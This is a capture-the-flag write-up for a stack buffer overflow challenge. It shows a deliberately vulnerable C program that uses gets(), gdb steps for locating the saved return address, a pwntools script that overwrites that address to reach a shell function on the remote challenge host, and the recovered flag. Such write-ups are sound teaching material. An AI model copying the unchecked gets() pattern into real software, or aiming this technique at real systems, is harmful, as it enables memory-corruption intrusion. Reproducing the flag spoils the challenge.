### CHALLENGE PROMPT :

ez overflow (or is it?)

nc cyberyoddha.baycyber.net 10002

Challenge also included a file called Overflow2

--------------------------------------------------------------------------------

The prompt provides us with a netcat host/ip we can connect into to send our payload.

Overflow2 is the following c programme .

  ```
  #include <stdio.h>
  #include <stdlib.h>
  #include <string.h>

  void run_shell(){
    system("/bin/sh");
  }

  void vuln(){
    char buf[16];
    gets(buf);
  }

  int main(void) {
    vuln();  
  }
  ```

We have to overwrite the return address saved on the stack from calling the vuln() function 
to redirect the flow of execution to the run_shell() function , in order to get a shell .

Let's use gdb to see whats going on under the hood :

  > gdb Overflow2 
  
After that we disassemble main() :

  >disassemble main
  
![main](https://user-images.githubusercontent.com/73142671/98143877-58665900-1ed2-11eb-8b39-819ea102a6fb.png)

Disassembling main shows that , after vuln function returns , it will continue at address **0x080491da**

Lets disassemble vuln() also :

  >disassemble vuln
  
 ![vuln](https://user-images.githubusercontent.com/73142671/98150889-03c5dc80-1ed8-11eb-8420-14b4f87a12d6.png)
 
 We are gonna place a breakpoint after the gets function is called in vuln so we can mess around with it .

  >b *0x080491bc 
  
  Outputs : " Breakpoint 1 at 0x80491bc: file overflow2.c, line 11. "

Then we are gonna run the programme from the breakpoint , and fill the buffer with 16 characters .

![run](https://user-images.githubusercontent.com/73142671/98151640-286e8400-1ed9-11eb-88f0-c3ffa8b61f38.png)

Let's examine the stack , starting from the stack point register .

  > x/24x $sp
  
![x32](https://user-images.githubusercontent.com/73142671/98151834-74212d80-1ed9-11eb-8aa6-fd6dc3c845cb.png)

  
Using the info frame command we can see where EIP is at .

  >info frame

![eip1](https://user-images.githubusercontent.com/73142671/98152028-c1050400-1ed9-11eb-9742-cb80713d7614.png)

Alternatively , we can calculate it with the find command :

  >find 0xffffd4a0, +96, 0x080491da

Outputs : 

" 0xffffd4cc
1 pattern found. "

After our analysis we know that the return address weâ€™re looking for (0x080491da) 
is at memory location **0xffffd4cc** and the start of buf is at **0xffffd4a0**

Now , we need to disassemble run_shell() to get the function's address .

![shellr](https://user-images.githubusercontent.com/73142671/98153097-59e84f00-1edb-11eb-9132-f656dc4a8dab.png)

Now we have the first address of the run_shell function , **0x08049172**

Alternatively , we could get the above address like this :

  >objdump -d Overflow2 | grep run_shell

which gives us *08049172*

So finally we have to override our return address (0x080491da) with 0x08049172 .

Let's write our exploit in python , utilizing the pwn lib :

  ```
  from pwn import *

  offset = 28

  r = remote('cyberyoddha.baycyber.net', 10002)

  payload = [
      b'A'*offset,
      p32(0x08049172)
  ]

  payload = b''.join(payload)

  r.send(payload)
  r.interactive()

  ```

Executing our programme we get a shell , and thus the flag .

**CYCTF{0v3rfl0w!ng_v@ri@bl3$_i$_3z}**


























